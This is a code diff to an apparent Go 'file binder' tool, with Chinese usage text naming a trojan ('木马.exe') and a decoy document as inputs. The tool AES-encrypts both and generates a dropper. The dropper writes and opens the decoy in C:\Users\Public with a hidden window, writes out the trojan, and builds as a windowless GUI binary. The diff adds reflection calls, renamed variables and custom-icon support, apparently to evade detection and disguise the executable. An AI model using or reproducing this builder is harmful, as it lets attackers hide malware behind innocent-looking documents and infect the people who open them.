@@ -26,8 +26,9 @@ var (
 	`
 	tvb = "这是我的频道欢迎投稿学习:https://space.bilibili.com/353948151	"
 
-	keytishi = `
-	首先编译好命令参数如: GoFileBinder.exe	木马.exe xxx.txt
+	tishi = `
+	命令参数如: main.exe	ma.exe xxx.doc 
+			  main.exe	ma.exe xxx.doc ico.syso
 	`
 )
 
@@ -44,8 +45,9 @@ func RandStr(length int) string {
 func main() {
 	fmt.Println(logo)
 	fmt.Println(tvb)
-	if len(os.Args) != 3 {
-		fmt.Println(keytishi)
+
+	if len(os.Args) != 3 && len(os.Args) != 4{
+		fmt.Println(tishi)
 		return
 	}
 	mumafile := os.Args[1]
@@ -59,66 +61,64 @@ func main() {
 	infodoc, _ := ioutil.ReadFile(docfile)
 	var docfileStr string = string(infodoc[:])
 	AesdocfileStr := AesEncrypt(docfileStr, key)
-	SourceCode := fmt.Sprintf(`
-	package main
-	import (
+	SourceCode := fmt.Sprintf(`package main
+import (
 	"crypto/aes"
 	"crypto/cipher"
 	"encoding/base64"
 	"os"
 	"os/exec"
+	"reflect"
 	"strings"
 	"syscall"
-	)
-	
-	var (
-		key          = "%s"
-		mumafilename = "%s"
-		docfilename  = "%s"
-		docfilenames = "%s"
-		docfile = "%s"
-		wenjianming = os.Args[0]
-		
-		numafile = "%s"
-		dstFile    = "Yihsiwei.DAT"
-		selfile, _ = os.Executable()
-		ddocfile = AesDecrypt(docfile, key)
+)
 
-		dmumafile = AesDecrypt(numafile, key)
-	)
-	
-	func main() {
-		a,_ := os.Getwd()
-		b := os.Args[0]
-		c := strings.Replace(b,a,"",-1)
-		dstFile = c
-		
-		panfu := selfile[0:2]
-		if !strings.Contains(selfile, "C:") {
-	
-			dstFile = panfu + "\\Yihsiwei.DAT"
-		} else {
-			dstFile = panfu + dstFile
-		}
+var (
+	jian          = "%s"
+	mumawenjianname = "%s"
+	docwenjianname  = "%s"
+	docwenjiannames = "%s"
+	docwenjian = "%s"
 
-		//os.Rename(selfile, dstFile)
+	numawenjian = "%s"
+	dstdawenjian    = "ffff.DAT"
+	selwenjian, _ = os.Executable()
+	ddocwenjian = str_func(aesjiami,docwenjian, jian)[0].String()
 
+	dmumawenjian = str_func(aesjiami,numawenjian, jian)[0].String()
+)
 
-		f2, _ := os.Create("C:\\Users\\Public\\" + docfilename)
-		_, _ = f2.Write([]byte(ddocfile))
-		f2.Close()
-		
+func main() {
+	a,_ := os.Getwd()
+	b := os.Args[0]
+	c := strings.Replace(b,a,"",-1)
+	dstdawenjian = c
 
-		cmd := exec.Command("cmd",  " /c ","C:\\Users\\Public\\"+docfilenames)
+	panfu := selwenjian[0:2]
+	if !strings.Contains(selwenjian, "C:") {
+
+		dstdawenjian = panfu + "\\ffff.DAT"
+	} else {
+		dstdawenjian = panfu + dstdawenjian
+	}
+
+	//os.Rename(selwenjian, dstdawenjian)
 
 
-		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-		//cmd2.Stdout = os.Stdout
-		_ = cmd.Start()
-		var dstFilecc = "C:\\Users\\Public\\" + mumafilename
-		f, _ := os.Create(dstFilecc)
-		_, _ = f.Write([]byte(dmumafile))
-		f.Close()
+	f2, _ := os.Create("C:\\Users\\Public\\" + docwenjianname)
+	_, _ = f2.Write([]byte(ddocwenjian))
+	f2.Close()
+
+
+	cmd := exec.Command("cmd",  " /c ","C:\\Users\\Public\\"+docwenjiannames)
+
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	//cmd2.Stdout = os.Stdout
+	_ = cmd.Start()
+	var dstFilecc = "C:\\Users\\Public\\" + mumawenjianname
+	f, _ := os.Create(dstFilecc)
+	_, _ = f.Write([]byte(dmumawenjian))
+	f.Close()
 
 
 	_, err := os.Stat(dstFilecc)
@@ -130,47 +130,84 @@ func main() {
 
 	}
 
-	
+
+}
+
+func Pdaing(org []byte) []byte {
+	length := len(org)
+	unpadding := int(org[length-1])
+	return org[:(length - unpadding)]
+}
+func aesjiami(can1 string, key string) string {
+	kuashuzu, _ := base64.StdEncoding.DecodeString(can1)
+	k := []byte(key)
+	blo, _ := aes.NewCipher(k)
+	blodaxiao := blo.BlockSize()
+	blomoshi := cipher.NewCBCDecrypter(blo, k[:blodaxiao])
+	org := make([]byte, len(kuashuzu))
+	blomoshi.CryptBlocks(org, kuashuzu)
+	org = str_func(Pdaing,org)[0].Bytes()
+	return string(org)
+}
+
+func str_func(hanshu interface{}, canshu ...interface{}) []reflect.Value {
+	//将函数包装为反射值对象
+	funcValue := reflect.ValueOf(hanshu)
+	//构造函数参数
+	paramList := []reflect.Value{}
+	for i := 0; i < len(canshu); i++ {
+		paramList = append(paramList, reflect.ValueOf(canshu[i]))
 	}
-	
-	func PKCS7UnPadding(origData []byte) []byte {
-		length := len(origData)
-		unpadding := int(origData[length-1])
-		return origData[:(length - unpadding)]
-	}
-	func AesDecrypt(cryted string, key string) string {
-		crytedByte, _ := base64.StdEncoding.DecodeString(cryted)
-		k := []byte(key)
-		block, _ := aes.NewCipher(k)
-		blockSize := block.BlockSize()
-		blockMode := cipher.NewCBCDecrypter(block, k[:blockSize])
-		orig := make([]byte, len(crytedByte))
-		blockMode.CryptBlocks(orig, crytedByte)
-		orig = PKCS7UnPadding(orig)
-		return string(orig)
-	}
+	//调用函数
+	jieguo := funcValue.Call(paramList)
+	//返回结果
+	return jieguo
+}
 	`, key, mumafile, docfile, docfile, AesdocfileStr, AesmumafileStr)
 
-	f, _ := os.Create("Yihsiwei.go")
+	lujing := ""
+	comm := "go build -ldflags \"-H=windowsgui\" main.go"
+	lujing2 := ""
+	if len(os.Args) == 4 {
+		os.Mkdir("./dabao", os.ModePerm)
+		lujing = "./dabao/"
+		lj, _ := os.Getwd()
+		lujing2 = lj+"\\dabao\\"
+		comm =  "cd "+ lujing2 + " && go build -ldflags \"-H=windowsgui\""
+		if strings.HasSuffix(os.Args[3],".syso") {
+			nr,err := ioutil.ReadFile(os.Args[3])
+			if err != nil {
+				return
+			}
+			f, _ := os.Create(lujing + "tubiao.syso")
+			_, _ = f.Write(nr)
+			f.Close()
+			exitfile(lujing + "tubiao.syso")
+			time.Sleep(time.Duration(1) * time.Second)
+		}else {
+			return
+		}
+	}
 
+	f, _ := os.Create(lujing + "main.go")
 	_, _ = f.Write([]byte(SourceCode))
 	f.Close()
-
-	exitfile("Yihsiwei.go")
+	exitfile(lujing +"main.go")
 	time.Sleep(time.Duration(1) * time.Second)
 
-	batfile, _ := os.Create("Yihsiwei.bat")
+	batfile, _ := os.Create(lujing +"Yihsiwei.bat")
 
-	_, _ = batfile.Write([]byte("go build -ldflags \"-H=windowsgui\" Yihsiwei.go"))
+	_, _ = batfile.Write([]byte(comm))
 	batfile.Close()
-	exitfile("Yihsiwei.bat")
+	exitfile(lujing +"Yihsiwei.bat")
 	time.Sleep(time.Duration(1) * time.Second)
-	cmd := exec.Command("Yihsiwei.bat")
-	_ = cmd.Start()
+	cmd := exec.Command(lujing2 +"Yihsiwei.bat")
+	cmd.Start()
 
-	exitfile("Yihsiwei.exe")
-	// os.RemoveAll("Yihsiwei.go")
-	// os.RemoveAll("Yihsiwei.bat")
+	exitfile(lujing +"dabao.exe")
+	os.RemoveAll(lujing +"main.go")
+	os.RemoveAll(lujing +"Yihsiwei.bat")
+	os.RemoveAll(lujing +"tubiao.syso")
 
 }
 func exitfile(filename string) {
@@ -178,6 +215,7 @@ func exitfile(filename string) {
 		fmt.Println(filename)
 		time.Sleep(time.Duration(1) * time.Second)
 		_, err := os.Stat(GetCurrentDirectory() + "/" + filename)
+		//fmt.Println(err)
 		if err == nil {
 			break
 		}
@@ -208,3 +246,5 @@ func AesEncrypt(orig string, key string) string {
 	blockMode.CryptBlocks(cryted, origData)
 	return base64.StdEncoding.EncodeToString(cryted)
 }
+
+
